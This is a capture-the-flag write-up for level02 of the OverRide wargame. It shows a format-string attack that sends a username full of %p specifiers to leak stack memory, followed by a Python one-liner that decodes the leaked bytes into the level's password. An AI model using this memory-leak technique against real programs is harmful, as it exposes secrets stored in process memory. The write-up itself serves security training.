level02
=======

```console
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```

*	We spawn with a [level02](src/level02) executable.
*	We have the [base](src/level02.c) and [clean](src/level02_clean.c) version of the code
*	Here are the things that we can notice by looking at it :
	- `passwordFile` contains the pass and seems to be `40 bytes` of size when it is compared
	- We have two important variables (`user`, `pass`) called by `fgets()` which isn't itself vulnerable, but the first one is called on a format string attack vulnerable `printf()` near the end of the code
*	First, let's try the printf approach and see what we can find:
	```console
	level02@OverRide:~$ ./level02 
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
	--[ Password: *****************************************
	aaaa 0x7fffffffe4f0 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x2070252070252070 0x7025207025207025 0x20702520 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 -->0x2070252061616161<-- 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
	```
	Systems seems to be in `x64`. We also found out that the start of our buffer is at the `28th` index.
*	One important thing here is that we know our variable is next to the password file. We don't even need to exploit anything because we have the pass right in front of us
*	Last thing to do would be to convert it:
	```console
	level02@OverRide:~$ python -c 'print("\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] + "\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] + "\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] + "\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] + "\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1])'
	Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
	```